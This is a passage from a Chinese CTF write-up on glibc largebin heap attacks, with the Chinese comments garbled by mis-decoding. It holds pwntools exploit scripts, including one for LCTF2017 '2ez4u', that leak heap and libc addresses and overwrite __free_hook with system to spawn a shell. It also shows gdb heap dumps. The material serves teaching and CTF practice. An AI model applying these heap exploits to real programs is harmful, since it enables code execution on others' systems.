å¯¹freeåçš„1åšoff-by-null,é€ æˆchunkæ”¶ç¼©</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)                  <span class="comment"># 7     # å°†0ff-by-nullæ”¶ç¼©åçš„freechunkåˆ†ä¸¤æ¬¡ç”³è¯·å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)                             <span class="comment"># è§¦å‘åå‘åˆå¹¶:0x508+0x18</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†åˆå¹¶åå¤§å°ä¸º0x538çš„freechunké‡æ–°æ„é€ æˆ0x38å’Œ0x4e8</span></span><br><span class="line">        add(<span class="number">0x38</span>)                   <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)                  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        edit(<span class="number">3</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 4</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)                  <span class="comment"># 8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)                     <span class="comment"># åå‘åˆå¹¶é€ å‡º0x530çš„freechunk</span></span><br><span class="line">        add(<span class="number">0x48</span>)                   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)                     <span class="comment"># unsortbin: 0x100203060 (size : 0x4f0) &lt;--&gt; 0x1002035c0 (size : 0x4e0)</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)                  <span class="comment"># 2</span></span><br><span class="line">        free(<span class="number">2</span>)                     <span class="comment"># æŠŠ0x4f0çš„æ”¾å›åˆ°unsortedbin</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        storage = <span class="number">0x13370800</span></span><br><span class="line">        fake_chunk = storage<span class="number">-0x20</span></span><br><span class="line">        p1 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x4f1</span>)+p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">        edit(<span class="number">7</span>,p1)                  <span class="comment"># åŠ«æŒunsortfbinä¸­chunkçš„bkæŒ‡é’ˆæŒ‡å‘fakechunk</span></span><br><span class="line"></span><br><span class="line">        p2 = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">        p2 += p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)          <span class="comment"># åŠ«æŒåœ¨largebinä¸­chunkçš„bkæŒ‡é’ˆé¿å…unlinkæ—¶å´©æºƒ</span></span><br><span class="line">        p2 +=  p64(<span class="number">0</span>)+p64(fake_chunk<span class="number">-0x18</span><span class="number">-4</span>)    <span class="comment"># åŠ«æŒåœ¨largebinä¸­chunkçš„bk_nextsizeæŒ‡é’ˆ</span></span><br><span class="line">        edit(<span class="number">8</span>,p2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>)       <span class="comment"># 2,largebin attackè§¦å‘,è¿”å›æˆ‘ä»¬ä¼ªé€ ä½ç½®çš„èŠ‚ç‚¹</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        p3 = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage)<span class="comment">#æ„é€ showå‡½æ•°çš„æ¡ä»¶</span></span><br><span class="line">        edit(<span class="number">2</span>,p3)</span><br><span class="line">        </span><br><span class="line">        pause()</span><br><span class="line">        p4 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(storage<span class="number">-0x20</span>+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        edit(<span class="number">0</span>,p4)      <span class="comment"># é‡æ–°å›å†™tableï¼Œæ”¹æ‰å¯¹åº”è¡¨é¡¹ä¸ºçœŸå®çš„ptr-sizeï¼Œè€Œéå¼‚æˆ–åçš„ï¼ŒåŒæ—¶æ”¹é‚£è¡¨å¤´å››ä¸ªéšæœºæ•°ä¸º0ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨xorçš„æ—¶å€™è¿”å›çš„å°±æ˜¯åœ°å€/sizeçœŸæ­£çš„å€¼äº†ã€‚</span></span><br><span class="line"></span><br><span class="line">        show(<span class="number">1</span>)         <span class="comment"># è¾“å‡ºæˆ‘ä»¬largebin attacké”™ä½å†™åœ¨fakechunkä¸Šçš„åœ°å€æ¥é‚£é“heapåœ°å€</span></span><br><span class="line">        r(<span class="number">11</span>)</span><br><span class="line">        heap = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        info(<span class="string">"heap:"</span>+hex(heap))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p5 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)    <span class="comment">#æ³„éœ²main_arena</span></span><br><span class="line">        edit(<span class="number">0</span>,p5)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#shell()</span></span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        libc_base =  int(u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))<span class="number">-88</span>-libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">     </span><br><span class="line">        system = libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">        free_hook = libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        <span class="keyword">print</span> (hex(system),hex(free_hook))</span><br><span class="line">        p6 =  p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(free_hook)+p64(<span class="number">0x1000</span>)+p64(storage+<span class="number">0x50</span>)+p64(<span class="number">0x100</span>)+<span class="string">'/bin/sh\x00'</span></span><br><span class="line">        edit(<span class="number">0</span>,p6)</span><br><span class="line">        edit(<span class="number">1</span>,p64(system))</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        shell()</span><br><span class="line">        pause()  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h1 id="ä¾‹é¢˜2ï¼šLCTF2017-2ez4u-å–å‡ºæ—¶æ”»å‡»"><a href="#ä¾‹é¢˜2ï¼šLCTF2017-2ez4u-å–å‡ºæ—¶æ”»å‡»" class="headerlink" title="ä¾‹é¢˜2ï¼šLCTF2017-2ez4u(å–å‡ºæ—¶æ”»å‡»)"></a>ä¾‹é¢˜2ï¼šLCTF2017-2ez4u(å–å‡ºæ—¶æ”»å‡»)</h1><h2 id="é¢˜ç›®æ¦‚è§ˆ-1"><a href="#é¢˜ç›®æ¦‚è§ˆ-1" class="headerlink" title="é¢˜ç›®æ¦‚è§ˆ"></a>é¢˜ç›®æ¦‚è§ˆ</h2><ol>
<li>uafï¼Œå¹¶ä¸”freeåè¿è¡¨ä¸­æŒ‡é’ˆä¹Ÿä¸æ¸…ç©ºï¼Œå¯ä»¥editå’Œshow</li>
<li>showçš„æ—¶å€™ä»addr+0x18å¼€å§‹ï¼Œåˆšå¥½è·³è¿‡äº†fdå’ŒbkæŒ‡é’ˆï¼Œæ‰€ä»¥æ²¡æ³•åˆ©ç”¨åœ¨unsortedbiné‡Œçš„showå‡ºæ¥ï¼Œè€Œæ˜¯éœ€è¦æ‹‰å…¥largebinç”¨nextsizeæŒ‡é’ˆã€‚<img src="https://s1.ax1x.com/2020/08/30/dbzAk6.png" alt></li>
</ol>
<h2 id="æ”»å‡»è¿‡ç¨‹-1"><a href="#æ”»å‡»è¿‡ç¨‹-1" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h2><p>å…¶å®ä¸»è¦å°±æ˜¯ä¼ªé€ ä¸€ç³»åˆ—çš„ç»“æ„ï¼Œæ„Ÿè§‰è¿™ä¸ªæ¯”ä¹‹å‰çš„é‚£ä¸ªè¦éº»çƒ¦ä¸€äº›</p>
<p>ä¸€å¼€å§‹çš„largebinæƒ…å†µå¦‚ä¸‹ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">largebin[ <span class="number">0</span>]: <span class="number">0xdf51549c30</span> (size : <span class="number">0x410</span>) &lt;--&gt; <span class="number">0xdf515497e0</span> (size : <span class="number">0x400</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>ä»¥ä¸‹è¿™å¼ å›¾å……åˆ†è¿˜åŸäº†largebinçš„æ”»å‡»è¿‡ç¨‹ï¼Œè¾¾åˆ°ä¸€æ¬¡ä»»æ„åœ°å€ç”³è¯·+overlap</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/30/dqR2A1.png" alt></p>
<hr>
<p>æˆ‘ä»¬å†å°†ä¸¤ä¸ª0x80çš„æ”¾å…¥fastbinè¿æ¥èµ·æ¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># æŠŠä¸¤ä¸ª0x80å¤§å°çš„æ”¾è¿›fastbin</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x8f90b03180</span> --&gt; <span class="number">0x8f90b03300</span> --&gt; <span class="number">0x0</span>	#æ­¤æ—¶åç§»ä¸º<span class="number">0x180</span>çš„chunkæœ‰æŒ‡å‘<span class="number">0x300</span>çš„æŒ‡é’ˆ</span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x8f90b044b0</span> (size : <span class="number">0x1fb50</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0x8f90b03000</span></span><br><span class="line">         largebin[ <span class="number">0</span>]: <span class="number">0x8f90b03c30</span> (invaild memory)</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬å†è¿›è¡Œä¸€æ¬¡addçš„æ—¶å€™ï¼š<strong>é¦–å…ˆæŠŠfastbinä¸­çš„chunkæ”¾å…¥smallbinï¼›ç„¶åè§¦å‘largebin attackç”³è¯·å‡ºæˆ‘ä»¬ä¼ªé€ çš„fakechunk</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3f0</span>,<span class="string">'b'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>))<span class="comment"># deadbeafæ˜¯ç”¨æ¥å¡«å……sizeçš„ï¼Œé˜²æ­¢è¾“å‡ºçš„æ—¶å€™00æˆªæ–­</span></span><br></pre></td></tr></table></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0xb4d2f9b300</span>  &lt;--&gt; <span class="number">0xb4d2f9b180</span> (size error (<span class="number">0xdeadbeefdeadbee8</span>)) &lt;--&gt; <span class="number">0xb4d2f9b000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4fe6dfe040</span>:   <span class="number">0x0000040000000001</span>      <span class="number">0x0000004fe6e000a0</span></span><br><span class="line"><span class="number">0x4fe6dfe050</span>:   <span class="number">0x0000006000000001</span>      <span class="number">0x0000004fe6dff090</span></span><br><span class="line"><span class="number">0x4fe6dfe060</span>:   <span class="number">0x0000006000000001</span>      <span class="number">0x0000004fe6dff110</span></span><br><span class="line"><span class="number">0x4fe6dfe070</span>:   <span class="number">0x000003f000000001</span>      <span class="number">0x0000004fe6dff140</span>		&lt;-----å¯ä»¥çœ‹åˆ°å·²ç»æŠŠfakechunkç”³è¯·å‡ºæ¥äº†</span><br></pre></td></tr></table></figure>

<p>smallbinä¹Ÿæ˜¯å¤´æ’å°¾å–ï¼Œå†addä¸€æ¬¡ï¼Œå–å‡ºsmallbinçš„æœ€åä¸€ä¸ªï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'6'</span><span class="number">*0</span>x60)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0xda50dfb300</span>  &lt;--&gt; <span class="number">0xda50dfb180</span> (size error (<span class="number">0xdeadbeefdeadbee8</span>))</span><br><span class="line">         largebin[ <span class="number">0</span>]: <span class="number">0xda50dfbc30</span> (invaild memory)</span><br></pre></td></tr></table></figure>

<p><strong>æ­¤æ—¶åœ¨smallbinä¸­çš„chunké‡Œæœ‰æŒ‡å‘main_arenaçš„æŒ‡é’ˆï¼Œä¸”è¿™ä¸ªchunkåˆšå¥½åœ¨æˆ‘ä»¬çš„fakechunkä¸‹é¢ä¸è¿œï¼Œç›´æ¥å¯ä»¥showå‡ºæ¥</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/31/dLvU2D.png" alt></p>
<p>ä¹‹åæˆ‘ä»¬æ‰‹åŠ¨æ¢å¤chunkç»“æ„ã€‚</p>
<p>æœ€åä½¿ç”¨fastbin attackåŠ«æŒunsortbinä¸­çš„top chunkæŒ‡å‘free_hook-0xb58,ç„¶åæ”¹freehookä¸ºsystemã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.terminal = <span class="string">'/bin/zsh'</span></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment">#7 playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> ) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment">#9 sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> ) <span class="comment">#0xa</span></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment">#0xb victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> ) <span class="comment">#0xc</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># åŠ«æŒåœ¨latgebinä¸­çš„victimçš„bk_nextsizeæŒ‡é’ˆæŒ‡å‘ï¼šHEAP+0x130</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># targetæ„é€ unlinkæ—¶çš„è¡¨ç»“æ„</span></span><br><span class="line"></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># æ­¤æ—¶å–å‡ºæˆ‘ä»¬è¦æ”»å‡»çš„å¤„äºlargebinä¸­çš„chunkï¼Œè§¦å‘largebin attackï¼Œå› ä¸ºbk_nextsizeæŒ‡é’ˆå·²ç»è¢«åŠ«æŒï¼Œæˆ‘ä»¬ä¼šç”³è¯·åˆ°å·²ç»æ„é€ ï¼Œå¸ƒç½®å¥½çš„fake chunkçš„ä½ç½®ï¼Œè¾¾åˆ°äº†ä»»æ„åœ°å€ç”³è¯·çš„ç›®çš„ã€‚</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0x3</span>)<span class="comment"># 3æ˜¯æˆ‘ä»¬ç”¨largebin attackç”³è¯·åˆ°çš„chunkï¼Œå¤§å°ä¼ªé€ 